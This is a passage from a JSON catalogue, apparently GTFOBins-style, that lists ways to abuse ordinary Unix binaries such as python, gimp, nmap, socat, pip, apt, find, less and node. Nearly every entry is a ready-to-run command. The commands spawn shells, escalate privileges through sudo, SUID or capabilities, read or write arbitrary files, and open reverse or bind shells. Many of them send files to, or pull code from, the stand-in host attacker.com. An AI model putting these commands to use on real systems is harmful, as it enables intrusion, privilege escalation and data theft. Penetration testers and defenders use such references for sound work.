\"$LFILE\"\n"}]}, "look": {"file-read": [{"code": "LFILE=file_to_read\nlook '' \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./look '' \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"}]}, "finger": {"file-upload": [{"description": "Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.", "code": "RHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\"\n"}], "file-download": [{"description": "Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | sudo nc -l -p 79` on the attacker box to send the file.", "code": "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\"\n"}]}, "gimp": {"shell": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"}], "reverse-shell": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n"}], "file-upload": [{"description": "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n"}, {"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n"}], "file-write": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'\n"}], "file-read": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'"}], "library-load": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"}], "suid": [{"code": "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"}], "sudo": [{"code": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"}]}, "python": {"shell": [{"code": "python -c 'import os; os.system(\"/bin/sh\")'"}], "reverse-shell": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n"}], "file-upload": [{"description": "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n"}, {"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n"}], "file-write": [{"code": "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'"}], "file-read": [{"code": "python -c 'print(open(\"file_to_read\").read())'"}], "library-load": [{"code": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"}], "suid": [{"code": "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"}], "sudo": [{"code": "sudo python -c 'import os; os.system(\"/bin/sh\")'"}], "capabilities": [{"code": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"}]}, "cobc": {"shell": [{"code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x\n"}], "sudo": [{"code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"}]}, "ldconfig": {"sudo": [{"description": "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.", "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"}], "limited-suid": [{"description": "This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.", "code": "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\n./ldconfig -f \"$TF/conf\"\n"}]}, "rlogin": {"file-upload": [{"description": "Send contents of a file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker system to capture the contents.\n\n`rlogin` hangs waiting for the remote peer to close the socket.\n\nThe file is corrupted by leading and trailing spurious data.\n", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nrlogin -l \"$(cat $LFILE)\" -p $RPORT $RHOST\n"}]}, "nmap": {"shell": [{"description": "Input echo is disabled.", "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n"}, {"description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.", "code": "nmap --interactive\nnmap> !sh\n"}], "non-interactive-reverse-shell": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF\n"}], "non-interactive-bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "export LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF\n"}], "file-upload": [{"description": "Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.", "code": "RHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF\n"}], "file-download": [{"description": "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080.", "code": "RHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF\n"}], "file-write": [{"code": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n"}], "file-read": [{"code": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n"}], "sudo": [{"description": "Input echo is disabled.", "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n"}, {"description": "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.", "code": "sudo nmap --interactive\nnmap> !sh\n"}], "limited-suid": [{"description": "Input echo is disabled.", "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF\n"}]}, "run-parts": {"shell": [{"code": "run-parts --new-session --regex '^sh$' /bin"}], "sudo": [{"code": "sudo run-parts --new-session --regex '^sh$' /bin"}], "suid": [{"code": "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"}]}, "lwp-download": {"file-download": [{"code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nlwp-download $URL $LFILE\n"}], "suid": [{"code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./lwp-download $URL $LFILE\n"}], "sudo": [{"code": "URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nsudo -E lwp-download $URL $LFILE\n"}]}, "ld.so": {"shell": [{"code": "/lib/ld.so /bin/sh"}], "suid": [{"code": "./ld.so /bin/sh -p"}], "sudo": [{"code": "sudo /lib/ld.so /bin/sh"}]}, "pry": {"shell": [{"code": "pry\nsystem(\"/bin/sh\")\n"}], "sudo": [{"code": "sudo pry\nsystem(\"/bin/sh\")\n"}], "limited-suid": [{"code": "./pry\nsystem(\"/bin/sh\")\n"}]}, "apt-get": {"shell": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "apt-get changelog apt\n!/bin/sh\n"}], "sudo": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo apt-get changelog apt\n!/bin/sh\n"}, {"description": "For this to work the target package (e.g., `sl`) must not be installed.", "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n"}, {"description": "When the shell exits the `update` command is actually executed.", "code": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"}]}, "date": {"file-read": [{"code": "LFILE=file_to_read\ndate -f $LFILE\n"}], "suid": [{"code": "LFILE=file_to_read\n./date -f $LFILE\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo date -f $LFILE\n"}]}, "readelf": {"file-read": [{"code": "LFILE=file_to_read\nreadelf -a @$LFILE\n"}], "suid": [{"code": "LFILE=file_to_read\n./readelf -a @$LFILE\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"}]}, "redcarpet": {"file-read": [{"code": "LFILE=file_to_read\nredcarpet \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"}]}, "nohup": {"shell": [{"code": "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""}], "command": [{"code": "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out\n"}], "sudo": [{"code": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""}], "suid": [{"code": "sudo nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""}]}, "socat": {"reverse-shell": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane\n"}], "bind-shell": [{"description": "Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.", "code": "LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane\n"}], "sudo": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nsudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane\n"}], "limited-suid": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane\n"}], "file-upload": [{"description": "Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT\n"}], "file-download": [{"description": "Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n"}]}, "pip": {"shell": [{"code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF\n"}], "reverse-shell": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF\n"}], "file-upload": [{"description": "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\npip install $TF\n"}, {"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\npip install $TF\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request. It needs an absolute local file path.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py\npip install $TF\n"}], "file-write": [{"description": "It needs an absolute local file path.", "code": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF\n"}], "file-read": [{"description": "The read file content is corrupted as wrapped within an exception error.", "code": "TF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF\n"}], "library-load": [{"code": "TF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF\n"}], "sudo": [{"code": "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"}]}, "make": {"shell": [{"code": "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"}], "file-write": [{"description": "Requires a newer GNU `make` version.", "code": "LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" .\n"}], "suid": [{"code": "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"}], "sudo": [{"code": "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"}]}, "zypper": {"shell": [{"description": "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.", "code": "zypper x\n"}, {"code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x\n"}], "sudo": [{"description": "This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.", "code": "sudo zypper x\n"}, {"code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nsudo -E zypper x\n"}]}, "apt": {"shell": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "apt-get changelog apt\n!/bin/sh\n"}], "sudo": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo apt-get changelog apt\n!/bin/sh\n"}, {"description": "For this to work the target package (e.g., `sl`) must not be installed.", "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n"}, {"description": "When the shell exits the `update` command is actually executed.", "code": "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"}]}, "base64": {"file-read": [{"code": "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode\n"}], "suid": [{"code": "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"}]}, "less": {"shell": [{"code": "less /etc/profile\n!/bin/sh\n"}, {"code": "VISUAL=\"/bin/sh -c '/bin/sh'\" less /etc/profile\nv\n"}], "file-read": [{"code": "less file_to_read"}, {"description": "This is useful when `less` is used as a pager by another binary to read a different file.", "code": "less /etc/profile\n:e file_to_read\n"}], "file-write": [{"code": "echo DATA | less\nsfile_to_write\nq\n"}, {"description": "This invokes the default editor to edit the file. The file must exist.", "code": "less file_to_write\nv\n"}], "sudo": [{"code": "sudo less /etc/profile\n!/bin/sh\n"}], "suid": [{"code": "./less file_to_read"}]}, "iftop": {"shell": [{"code": "iftop\n!/bin/sh\n"}], "limited-suid": [{"code": "./iftop\n!/bin/sh\n"}], "sudo": [{"code": "sudo iftop\n!/bin/sh\n"}]}, "dnf": {"sudo": [{"description": "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n", "code": "sudo dnf install -y x-1.0-1.noarch.rpm\n"}]}, "find": {"shell": [{"code": "find . -exec /bin/sh \\; -quit"}], "suid": [{"code": "./find . -exec /bin/sh -p \\; -quit"}], "sudo": [{"code": "sudo find . -exec /bin/sh \\; -quit"}]}, "systemctl": {"suid": [{"code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"}], "sudo": [{"code": "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n"}, {"code": "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n"}, {"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo systemctl\n!sh\n"}]}, "dash": {"shell": [{"code": "dash"}], "file-write": [{"code": "export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'\n"}], "suid": [{"code": "./dash -p"}], "sudo": [{"code": "sudo dash"}]}, "bpftrace": {"sudo": [{"code": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"}, {"code": "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n"}, {"code": "sudo bpftrace -c /bin/sh -e 'END {exit()}'"}]}, "busctl": {"shell": [{"code": "busctl --show-machine\n!/bin/sh\n"}], "sudo": [{"code": "sudo busctl --show-machine\n!/bin/sh\n"}]}, "nawk": {"shell": [{"code": "nawk 'BEGIN {system(\"/bin/sh\")}'"}], "non-interactive-reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nnawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}], "non-interactive-bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "LPORT=12345\nnawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"}], "file-write": [{"code": "LFILE=file_to_write\nnawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"}], "file-read": [{"code": "LFILE=file_to_read\nnawk '//' \"$LFILE\"\n"}], "sudo": [{"code": "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"}], "limited-suid": [{"code": "./nawk 'BEGIN {system(\"/bin/sh\")}'"}]}, "cpan": {"shell": [{"description": "`cpan` lets you execute perl commands with the `! command`.\n", "code": "cpan\n! exec '/bin/bash'\n"}], "reverse-shell": [{"description": "Run `nc -lvp RPORT` on the attacker box to receive the shell.", "code": "export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};\n"}], "file-upload": [{"description": "Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.", "code": "cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();\n"}], "file-download": [{"description": "Fetch a remote file via an HTTP GET request and store it in `PWD`.", "code": "export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();\n"}], "sudo": [{"code": "sudo cpan\n! exec '/bin/bash'\n"}]}, "chroot": {"suid": [{"code": "./chroot / /bin/sh -p\n"}], "sudo": [{"code": "sudo chroot /\n"}]}, "jq": {"file-read": [{"code": "LFILE=file_to_read\njq -Rr . \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"}]}, "facter": {"shell": [{"code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter\n"}], "sudo": [{"code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF sudo -E facter\n"}]}, "irb": {"shell": [{"code": "irb\nexec '/bin/bash'\n"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end\n"}], "file-upload": [{"description": "Serve files in the local folder running an HTTP server on port 8888.", "code": "irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;\n"}], "file-download": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])\n"}], "file-write": [{"code": "irb\nFile.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }\n"}], "file-read": [{"code": "irb\nputs File.read(\"file_to_read\")\n"}], "library-load": [{"code": "irb\nrequire \"fiddle\"; Fiddle.dlopen(\"lib.so\")\n"}], "sudo": [{"code": "sudo irb\nexec '/bin/bash'\n"}]}, "head": {"file-read": [{"code": "LFILE=file_to_read\nhead -c1G \"$LFILE\"\n"}], "suid": [{"code": "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"}], "sudo": [{"code": "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"}]}, "shuf": {"file-read": [{"description": "The read file content is corrupted by randomizing the order of NUL terminated strings.", "code": "LFILE=file_to_read\nshuf -z \"$LFILE\"\n"}], "file-write": [{"description": "The written file content is corrupted by adding a newline.", "code": "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\"\n"}], "suid": [{"description": "The written file content is corrupted by adding a newline.", "code": "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"}], "sudo": [{"description": "The written file content is corrupted by adding a newline.", "code": "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"}]}, "mail": {"shell": [{"description": "GNU version only.", "code": "mail --exec='!/bin/sh'"}, {"description": "This creates a valid Mbox file which may be required by the binary.", "code": "TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh\n"}], "sudo": [{"description": "GNU version only.", "code": "sudo mail --exec='!/bin/sh'"}]}, "top": {"shell": [{"code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset\n"}], "sudo": [{"description": "This requires that the root configuration file is writable and might be used to persist elevated privileges.", "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"}]}, "rpmquery": {"shell": [{"code": "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"}], "suid": [{"code": "./rpmquery --eval '%{lua:posix.exec(\"/bin/sh\", \"-p\")}'"}], "sudo": [{"code": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"}]}, "sftp": {"shell": [{"code": "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n"}], "file-upload": [{"description": "Send local file to a SSH server.", "code": "RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save\n"}], "file-download": [{"description": "Fetch a remote file from a SSH server.", "code": "RHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save\n"}], "sudo": [{"code": "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"}]}, "node": {"shell": [{"code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"}], "reverse-shell": [{"description": "Run `nc -l -p 12345` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nnet.connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n});'\n"}], "bind-shell": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell.", "code": "export 